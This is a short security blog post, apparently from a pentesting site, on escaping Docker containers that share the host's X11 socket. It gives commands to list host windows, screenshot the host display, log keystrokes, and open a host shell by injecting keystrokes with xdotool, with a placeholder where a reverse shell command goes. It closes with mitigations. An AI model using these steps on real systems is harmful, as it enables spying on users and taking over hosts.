<!DOCTYPE html>
<html lang="en-us">
    <head>
         
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Docker Breakout Using X11</title>
        <style>

    html body {
        font-family: 'Raleway', sans-serif;
        background-color: white;
    }

    :root {
        --accent: #ffe135;
        --border-width:  5px ;
    }

</style>





<link rel="stylesheet" href="https://bananamafia.dev//css/font.css">


 <link rel="stylesheet" href="https://bananamafia.dev//css/solarized-dark.min.css"> 


<link rel="stylesheet" href="https://bananamafia.dev//css/bootstrap-min.css" integrity="">


<link rel="stylesheet" href="https://bananamafia.dev//css/main.css">


<link rel="stylesheet" href="https://bananamafia.dev//css/font-awesome.min.css" integrity="">
 


<script src="https://bananamafia.dev/js/highlight.min.js"></script>


<script src="https://bananamafia.dev/js/python.min.js"></script> 
<script src="https://bananamafia.dev/js/cpp.min.js"></script> 
<script src="https://bananamafia.dev/js/json.min.js"></script> 
<script src="https://bananamafia.dev/js/go.min.js"></script> 

<script>
  hljs.initHighlightingOnLoad();
</script>




<script async src="https://www.googletagmanager.com/gtag/js?id=UA-143157939-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag() { dataLayer.push(arguments); }
  gtag('js', new Date());

  gtag('config', 'UA-143157939-1');
</script>





















<script src="https://bananamafia.dev/js/jquery.min.js"></script>


<script src="https://bananamafia.dev/js/bootstrap.min.js"></script>


<script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script> <meta name="generator" content="Hugo 0.62.2" />
        

        
    </head>

    


    <body>
         
        <nav class="navbar navbar-default navbar-fixed-top">

            <div class="container">

                <div class="navbar-header">

                    <a class="navbar-brand visible-xs" href="#">Docker Breakout Using X11</a>

                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>

                </div>

                <div class="collapse navbar-collapse">

                    
                        <ul class="nav navbar-nav">
                            
                                <li><a href="/">Home</a></li>
                            
                                <li><a href="/post/">Posts</a></li>
                            
                                <li><a href="/project/">Projects</a></li>
                            
                        </ul>
                    

                    
                        <ul class="nav navbar-nav navbar-right">
                            
                                <li class="navbar-icon"><a href="mailto:ps1337@mailbox.org"><i class="fa fa-envelope-o"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://github.com/ps1337/"><i class="fa fa-github"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://twitter.com/CaptnBanana"><i class="fa fa-twitter"></i></a></li>
                            
                                <li class="navbar-icon"><a href="/index.xml"><i class="fa fa-rss"></i></a></li>
                            
                                <li class="navbar-icon"><a href="https://www.youtube.com/watch?v=QKWKUU0XQ8U"><i class="fa fa-envira"></i></a></li>
                            
                        </ul>
                    

                </div>

            </div>

        </nav>


<main id="main">

    <div class="item">

    
    
    

    

    <h4><a href="/post/docker-breakout/">Docker Breakout Using X11</a></h4>
    <h5></h5>
    
    <a href="https://bananamafia.dev/tags/docker"><kbd class="item-tag">docker</kbd></a>
    
    <a href="https://bananamafia.dev/tags/pentesting"><kbd class="item-tag">pentesting</kbd></a>
    
    <a href="https://bananamafia.dev/tags/hacking"><kbd class="item-tag">hacking</kbd></a>
    

</div>


    <br>
    <div class="content-width text-justify"><p>Use Docker to run GUI applications they said.</p>
<p>Mount the X11 socket they said.</p>
<p>Allow other users to access your X session they said.</p>
<p>This post covers Docker container breakouts by abusing bad security practices related to the X11 socket.</p>
<h1 id="the-problem">The problem</h1>
<p>To display windows spawned through a Docker container, people often launch containers following these steps:</p>
<ul>
<li>Use <code>-e DISPLAY=$DISPLAY</code> to share the display variable value</li>
<li>Specifying <code>-v /tmp/.X11-unix:/tmp/.X11-unix:ro</code> shares the X11 socket - optionally as read only.</li>
<li>&ldquo;I can't see the window, let's <a href="https://bing.com">google</a>&hellip;&rdquo;</li>
<li>&ldquo;Let's just execute <code>xhost +local:root</code> and it works!&rdquo;</li>
</ul>
<p>The X11 socket is mounted as read only - it's secure right?</p>
<h1 id="the-breakouts">The breakout(s)</h1>
<p>These attacks can be performed after gaining access to a Docker container:</p>
<h2 id="reading-window-information">Reading Window Information</h2>
<p>With <code>xwininfo -root -tree</code> it's possible to check which windows are opened on the host system, including the window titles:</p>
<pre><code>[...]
0xredacted &quot;[i3 con] container around 0xredacted&quot;: (&quot;i3-frame&quot; &quot;i3-frame&quot;) [...]
        1 child:
        0xredacted &quot;Write: super secret thing&quot;: (&quot;Msgcompose&quot; &quot;Thunderbird&quot;) [...]
[...]
</code></pre><h2 id="taking-screenshots">Taking screenshots</h2>
<p>The command</p>
<pre><code>xwd -root -screen &gt; screenshot.xwd &amp;&amp; convert screenshot.xwd screenshot.png
</code></pre><p>can be used to create a screenshot of the hosts display which makes it possible to watch every action a user performs on the system.</p>
<h2 id="keylogging">Keylogging</h2>
<p>By mounting the X11 socket into the container a user doesn't just mount the display. Additionally they keyboard also gets shared, so to say. With this, it's possible to log all keystrokes. There may be better tools for this, but during tests <a href="https://github.com/unixdj/xkey">xkey</a> seemed to perform very reliable. Using <code>xkey</code> it's possible to perform a specific action in case a previously defined key gets hit.</p>
<h2 id="getting-a-shell">Getting a shell</h2>
<p>Although it's not very stealthy, this method allows getting a shell on the host system. This works by sending keystrokes to the X server in order to open a terminal and execute commands:</p>
<pre><code>xdotool key &lt;Shortcut to open a terminal&gt;
xdotool type 'xterm'
xdotool key Return
xdotool type --delay 50 '&lt;Desired reverse or bind shell command&gt;'
xdotool key Return
</code></pre><p><img src="/img/docker-breakout/thisisfine.gif" alt="This is fine"></p>
<h1 id="the-mitigation">The mitigation</h1>
<ul>
<li><a href="https://stackoverflow.com/questions/16296753/can-you-run-gui-apps-in-a-docker-container">Use XAuthority</a> and don't use the root user to spawn an X application.</li>
<li>Check <a href="https://github.com/mviereck/x11docker">x11docker</a> which basically creates a new X server for isolation purposes.</li>
</ul>
<h1 id="resources">Resources</h1>
<ul>
<li><a href="https://zachgrace.com/training/X11.html">X11 Hacking</a></li>
</ul>
</div>

    
    

    

    <h4 id="related" class="page-header">Related</h4>

     <div class="item">

    
    
    

    

    <h4><a href="/post/docker-leak/">Information Leak in Docker</a></h4>
    <h5></h5>
    
    <a href="https://bananamafia.dev/tags/docker"><kbd class="item-tag">docker</kbd></a>
    
    <a href="https://bananamafia.dev/tags/vulnerability"><kbd class="item-tag">vulnerability</kbd></a>
    

</div>
  <div class="item">

    
    
    

    

    <h4><a href="/post/shell-upgrade/">Methods to Upgrade nc Reverse Shells</a></h4>
    <h5></h5>
    
    <a href="https://bananamafia.dev/tags/pentesting"><kbd class="item-tag">pentesting</kbd></a>
    
    <a href="https://bananamafia.dev/tags/shell"><kbd class="item-tag">shell</kbd></a>
    

</div>
  <div class="item">

    
    
    

    

    <h4><a href="/post/python-hax/">2 Common Python Security Issues</a></h4>
    <h5></h5>
    
    <a href="https://bananamafia.dev/tags/pentesting"><kbd class="item-tag">pentesting</kbd></a>
    
    <a href="https://bananamafia.dev/tags/python"><kbd class="item-tag">python</kbd></a>
    

</div>
 

    

</main>
<footer id="footer">
    <img style="width:42vh" src="/img/tag.png">

    <p class="copyright text-muted">

        Â© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a>
    </p>
</footer>
</body>

<script>
    var footerWidth = 200;
    $(document).ready(function () {
        setWidth();
        $(window).bind("resize", setWidth);
    });

    $(window).on('load', function () {
        setWidth();
    });

    function setWidth() {
        footerWidth = $("main").width();

        $("#footer").css("min-width", (footerWidth > 300 ? footerWidth : 300) + "px");
        
    }

    $(window).on('resize', function () {
        setWidth();
    });

</script>

</html>


<script>
    var width = 200;
    $(document).ready(function () {
        setMaxWidth();
        $(window).bind("resize", setMaxWidth);
    });


    function setMaxWidth() {
        $("pre > code").css("display", "none");
        $("pre").css("display", "none");

        width = $("#related").width();

        $("pre > code").css("display", "block");
        $("pre").css("display", "block");

        $("pre > code").css("maxWidth", (width) + "px");
        $("pre").css("maxWidth", (width) + "px");
    }

    $(window).on('resize', function () {
        setMaxWidth();
    });

    $(window).on('load', function () {
        setMaxWidth();
    });



</script>